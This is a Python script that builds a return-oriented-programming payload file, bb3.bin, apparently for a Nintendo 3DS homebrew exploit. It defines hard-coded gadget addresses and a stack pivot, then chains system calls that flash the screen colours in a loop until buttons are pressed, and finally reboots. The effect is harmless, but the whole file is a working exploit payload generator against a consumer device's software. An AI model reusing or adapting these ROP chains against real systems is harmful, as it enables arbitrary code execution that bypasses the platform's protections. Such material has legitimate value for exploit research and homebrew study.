import os,sys,struct

# payload rop - bb3.bin --------------------------------------------------------------------------------------------------------------
# flashing colors demo
# ------------------------------------------------------------------------------------------------------------------------------------

PAYLOAD=b""
offset=0
BREAK=0

ENTRY=0x006AA000
GARBAGE=0xdeadbeef

POP_PC=0x0011a1d4
POP_R0PC=0x00146760
POP_R1PC=0x001d53f8
POP_R2PC=0x207d30+1 #: pop {r2, pc}
POP_R0R2PC=0x00164654+1
POP_R0R3PC=0x0022c0e4+1


POP_R2R6PC=0x114444+1 #: pop {r2, r3, r4, r5, r6, pc}
POP_R0R6_SKIPR5_PC=0x166340+1 #: pop {r0, r1, r2, r3, r4, r6, pc}
ROP_CMPR1R0_ETC_POPR4R6PC=0x0020a318 #: cmp r1, r0 ; ldreq r0, [r5, #0x98] ; ldrne r0, [r5, #0x9c] ; str r0, [r5, #0xa0] ; pop {r4, r5, r6, pc}        
POP_R4R5_BXLR=0x00106cdc #pop {r4, r5}; bx lr;
ROP_LDR_R0FROMR0=0x0010d364
ROP_STMR0R2R6_POPR4R6PC=0x001a2784 #: stm r5, {r0, r1, r2, r6} ; pop {r4, r5, r6, pc}

STACK_PIVOT=0x001d5b40 #: ldmdb r6, {r4, r5, r6, ip, sp, lr, pc} ^ 40 5b 1d 00                      
GSPGPU_HANDLE=0x002993c4
HWREGS_ADDR= 0x0202A04
HID_PAD=0x1000001C
PAD_A=1<<0
PAD_B=1<<1
PAD_X=1<<10
PAD_Y=1<<11
BOTTOM=0
TOP=1

GSPGPU_WriteHWRegs=0x00136200 
svcSleepThread=0x001bdbd0
NS_Reboot=0x00103e08
MEMCPY=0x001d0d5c
svcGetSystemTick=0x1BDDBC

END=ENTRY+0x200
BLUE=END+0
YELLOW=BLUE+4
SVC_COLOR0=YELLOW+4
SVC_COLOR1=SVC_COLOR0+4
SVC_COLOR=SVC_COLOR1+4

def w(n):
	global PAYLOAD,offset
	offset+=4
	PAYLOAD += struct.pack("<I",n)
	
def w_insert(word, target):
	global PAYLOAD,ENTRY
	index=target-ENTRY
	PAYLOAD = PAYLOAD[:index] + struct.pack("<I",word) + PAYLOAD[index+4:]
	
def padto(rop_offset, fillword):
	global offset,ENTRY
	padsize=(rop_offset-(offset-ENTRY))//4
	for i in range(padsize):
		w(fillword)	
	
def color(coloraddr, istop):
	global offset
	w(POP_R0R3PC)
	w(	GSPGPU_HANDLE)
	w(	HWREGS_ADDR-(istop*0x800))
	w(	coloraddr)
	w(	4)
	w(GSPGPU_WriteHWRegs)
	w(	GARBAGE)
	w(	GARBAGE)
	w(	GARBAGE)

def sleep(ms):
	global offset
	t=ms*1000*1000
	w(POP_R0PC)
	w(	t & 0xffffffff)
	w(POP_R1PC)
	w(	(t >> 32) & 0x7fffffff)  #leave off MSb because this needs to be positive s64
	w(svcSleepThread) #lets hope lr stays poppc!
	
def pivot(addr):
	global offset
	w(POP_R2R6PC)
	w(	GARBAGE)
	w(	addr)
	w(	POP_PC)
	w(	POP_PC)
	w(	offset)
	w(STACK_PIVOT)
	
def compare_jump(addr_checked, to_value, equal_jump_addr, unequal_jump_addr): #quite a bit for a simple branch! We take HLLs for granted.
	global offset,T1
	w(POP_R0PC)
	w(	addr_checked)	
	w(ROP_LDR_R0FROMR0)
	w(POP_R1PC)
	w(	to_value)
	w(POP_R4R5_BXLR)
	w(	GARBAGE)
	w(	offset-0x80)
	w(ROP_CMPR1R0_ETC_POPR4R6PC)
	w(	GARBAGE)
	w(	GARBAGE)
	w(	GARBAGE)
	w(POP_R0R6_SKIPR5_PC)
	BREAK=offset
	w(	BREAK+(7*4)) #jump over the manually counted next 7 words
	w(	unequal_jump_addr)
	w(	GARBAGE) #jump addr will be filled in by the cmp_etc gadget
	w(	POP_PC)
	w(	POP_PC)
	w(	offset)
	w(STACK_PIVOT)
	
def memcpy(dest, src, size):
	w(POP_R0R2PC)
	w(	dest)
	w(	src)
	w(	size)
	w(MEMCPY)
	
def gettick():
	w(svcGetSystemTick)
	w(POP_R4R5_BXLR)
	w(	GARBAGE)
	w(	SVC_COLOR0)
	w(ROP_STMR0R2R6_POPR4R6PC)
	w(	GARBAGE)
	w(	GARBAGE)
	w(	GARBAGE)

#ROP time
offset=ENTRY

w(POP_PC)
w(POP_PC)

LOOP=offset
sleep(250)
gettick()
memcpy(SVC_COLOR, SVC_COLOR0, 3)
memcpy(SVC_COLOR+3, YELLOW+3, 1)
color(SVC_COLOR,TOP)
sleep(250)
gettick()
memcpy(SVC_COLOR, SVC_COLOR0, 3)
memcpy(SVC_COLOR+3, YELLOW+3, 1)
color(SVC_COLOR,BOTTOM)

compare_jump(HID_PAD, (PAD_A | PAD_B), BREAK, LOOP)

color(BLUE,TOP)
color(YELLOW,BOTTOM)
w(NS_Reboot)

padto(END-ENTRY,GARBAGE)

w(0x01B75700) #blue
w(0x0100DDFF) #yellow
w(GARBAGE)    #svc_color0
w(GARBAGE)    #svc_color1
w(0x01000000) #svc_color

padto(0x80200, 0x00000000)

print("__PAYLOAD__")
for i in range(0,0x200,16):
	out="%02X "*16 % struct.unpack("16B", PAYLOAD[i+0:i+16])
	out2="%08X: " % (ENTRY+i)
	print(out2+out)

with open("bb3.bin","wb") as f:
	f.write(PAYLOAD)
